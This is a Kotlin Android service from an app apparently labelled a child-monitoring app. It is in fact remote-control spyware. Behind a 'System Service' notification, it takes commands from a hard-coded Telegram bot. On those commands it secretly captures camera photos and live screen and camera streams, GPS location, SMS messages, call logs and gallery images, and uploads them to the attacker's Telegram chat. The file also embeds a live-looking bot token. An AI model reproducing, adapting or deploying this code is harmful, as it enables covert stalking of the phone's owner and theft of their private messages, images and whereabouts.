package com.coc338781.childapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.os.Build
import android.os.Vibrator
import android.provider.CallLog
import android.provider.MediaStore
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class MonitoringService : LifecycleService() {

    companion object {
        // ===== මෙතන ඔබේ විස්තර =====
        const val BOT_TOKEN = "8968739971:AAEsGJc_-MNGE8KKxqwzaZM3TPinPVg_Bms"
        const val CHAT_ID = "7905408190"
        // ============================
        const val CHANNEL_ID = "svc_channel"
        private const val TAG = "MonSvc"
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private var lastUpdateId = 0L
    private var isRunning = true
    private var liveJob: Job? = null
    private var flashOn = false

    override fun onCreate() {
        super.onCreate()
        try {
            createChannel()
            startFg()
            startPolling()
        } catch (e: Exception) { Log.e(TAG, "onCreate", e) }
    }

    private fun startFg() {
        val n = buildNotification()
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, n,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else if (Build.VERSION.SDK_INT >= 29) {
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(1, n)
        }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }

    private fun startPolling() {
        lifecycleScope.launch(Dispatchers.IO) {
            while (isRunning) {
                try {
                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=25"
                    val resp = client.newCall(Request.Builder().url(url).build()).execute()
                    val body = resp.body?.string() ?: continue
                    val result = JSONObject(body).optJSONArray("result") ?: continue
                    for (i in 0 until result.length()) {
                        val u = result.getJSONObject(i)
                        lastUpdateId = u.getLong("update_id")
                        val m = u.optJSONObject("message") ?: continue
                        val cid = m.getJSONObject("chat").getLong("id").toString()
                        if (cid != CHAT_ID) continue
                        val text = m.optString("text", "")
                        if (text.isNotEmpty()) withContext(Dispatchers.Main) { handle(text.trim()) }
                    }
                } catch (e: Exception) { delay(5000) }
            }
        }
    }

    private fun handle(raw: String) {
        val cmd = raw.lowercase()
        val arg = raw.substringAfter(' ', "").trim()
        when {
            cmd == "/ping" -> sendMsg("🏓 Pong! App is alive\n\nCameras:\n" + CameraHelper.listCameras(this))
            cmd == "/cam" -> photo(true)
            cmd == "/selfie" -> photo(false)
            cmd == "/livecam" -> live(true, arg.toIntOrNull() ?: 30)
            cmd == "/liveselfie" -> live(false, arg.toIntOrNull() ?: 30)
            cmd == "/stop" -> { liveJob?.cancel(); sendMsg("⏹ Live stopped") }
            cmd == "/screen" -> screen()
            cmd == "/livescreen" -> liveScreen(arg.toIntOrNull() ?: 30)
            cmd == "/location" -> location()
            cmd == "/battery" -> battery()
            cmd == "/sms" -> sms()
            cmd == "/calls" -> calls()
            cmd == "/gallery" -> gallery()
            cmd == "/flash" -> flash()
            cmd == "/vibrate" -> vibrate()
            cmd == "/toast" -> toast(arg)
            cmd == "/help" -> sendMsg(
                "📋 Commands:\n/cam /selfie\n/livecam [sec] /liveselfie [sec]\n/stop\n/screen /livescreen [sec]\n/location /battery\n/sms /calls /gallery\n/flash /vibrate /toast [msg]\n/ping")
            else -> sendMsg("❓ Unknown: $raw")
        }
    }

   private fun photo(back: Boolean) {
    sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
    CameraHelper.takePhoto(this, back) { f, info ->
        if (f != null) {
            sendMsg("📸 Camera: $info")
            sendPhoto(f)
        } else {
            sendMsg("🔴 Failed: $info")
        }
    }
   } 

    private fun live(back: Boolean, seconds: Int) {
    liveJob?.cancel()
    sendMsg("🔴 Live camera started (${seconds}s)")
    liveJob = lifecycleScope.launch(Dispatchers.IO) {
        val end = System.currentTimeMillis() + seconds * 1000L
        var count = 0
        var firstInfo = ""
        while (System.currentTimeMillis() < end && isRunning) {
            val done = java.util.concurrent.CountDownLatch(1)
            var gotFile: File? = null
            withContext(Dispatchers.Main) {
                CameraHelper.takePhoto(this@MonitoringService, back) { f, info ->
                    if (f != null) gotFile = f
                    if (firstInfo.isEmpty()) firstInfo = info
                    done.countDown()
                }
            }
            done.await()
            if (gotFile != null) {
                sendPhotoFile(gotFile!!)
                count++
            }
            delay(2000)
        }
        withContext(Dispatchers.Main) {
            sendMsg("🟢 Live ended ($count photos) [$firstInfo]")
        }
    }
    }

    private fun screen() {
        val svc = ScreenService.instance
        if (svc == null) { sendMsg("❌ Enable Accessibility Service"); return }
        if (Build.VERSION.SDK_INT < 30) { sendMsg("❌ Android 11+ only"); return }
        sendMsg("📸 Screenshot...")
        svc.takeShot { bmp -> if (bmp != null) svc.sendScreen(bmp) else sendMsg("🔴 Failed") }
    }

    private fun liveScreen(seconds: Int) {
        val svc = ScreenService.instance
        if (svc == null) { sendMsg("❌ Enable Accessibility"); return }
        if (Build.VERSION.SDK_INT < 30) { sendMsg("❌ Android 11+"); return }
        liveJob?.cancel()
        sendMsg("🔴 Live screen (${seconds}s, 1/2s)")
        liveJob = lifecycleScope.launch(Dispatchers.IO) {
            val end = System.currentTimeMillis() + seconds * 1000L
            while (System.currentTimeMillis() < end && isRunning) {
                withContext(Dispatchers.Main) {
                    svc.takeShot { bmp -> if (bmp != null) svc.sendScreen(bmp) }
                }
                delay(2000)
            }
            withContext(Dispatchers.Main) { sendMsg("🟢 Live screen ended") }
        }
    }

    private fun location() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc == null) { sendMsg("❌ No location"); return }
            val link = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
            sendMsg("📍 Location\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\n\n$link")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun battery() {
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val lvl = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val charging = bm.isCharging
            sendMsg("🔋 Battery: $lvl%\n${if (charging) "⚡ Charging" else "Not charging"}")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun sms() {
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10")
            val sb = StringBuilder("💬 Latest SMS:\n\n")
            var c = 0
            cursor?.use {
                while (it.moveToNext() && c < 10) {
                    val addr = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    sb.append("📩 $addr\n$body\n\n")
                    c++
                }
            }
            sendMsg(sb.toString())
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun calls() {
        try {
            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 10")
            val sb = StringBuilder("📞 Recent calls:\n\n")
            var c = 0
            cursor?.use {
                while (it.moveToNext() && c < 10) {
                    val num = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val dur = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val t = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "📥"
                        CallLog.Calls.OUTGOING_TYPE -> "📤"
                        CallLog.Calls.MISSED_TYPE -> "❌"
                        else -> "?"
                    }
                    sb.append("$t $num (${dur}s)\n")
                    c++
                }
            }
            sendMsg(sb.toString())
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun gallery() {
        try {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val cursor = contentResolver.query(uri, null, null, null, "date_added DESC LIMIT 5")
            var c = 0
            cursor?.use {
                while (it.moveToNext() && c < 5) {
                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                    val fileUri = android.content.ContentUris.withAppendedId(uri, id)
                    val bytes = contentResolver.openInputStream(fileUri)?.readBytes()
                    if (bytes != null) {
                        val f = File(cacheDir, "gal_$id.jpg")
                        f.writeBytes(bytes)
                        sendPhoto(f)
                    }
                    c++
                }
            }
            if (c == 0) sendMsg("❌ No photos")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun flash() {
        try {
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull { camId ->
                cm.getCameraCharacteristics(camId)
                    .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: run { sendMsg("❌ No flash"); return }
            flashOn = !flashOn
            cm.setTorchMode(id, flashOn)
            sendMsg("🔆 Flash ${if (flashOn) "ON" else "OFF"}")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun vibrate() {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(android.os.VibrationEffect.createOneShot(1000, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION") v.vibrate(1000)
            }
            sendMsg("📳 Vibrating")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun toast(msg: String) {
        if (msg.isEmpty()) return
        android.os.Handler(mainLooper).post {
            Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
        }
        sendMsg("✅ Toast shown: $msg")
    }

    private fun sendMsg(t: String) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
                val json = JSONObject().apply { put("chat_id", CHAT_ID); put("text", t) }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }

    private fun sendPhoto(f: File) {
        lifecycleScope.launch(Dispatchers.IO) { sendPhotoFile(f) }
    }

    private fun sendPhotoFile(f: File) {
        try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", f.name, f.asRequestBody("image/jpeg".toMediaType()))
                .build()
            client.newCall(Request.Builder().url(url).post(body).build()).execute()
            f.delete()
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        liveJob?.cancel()
    }
}
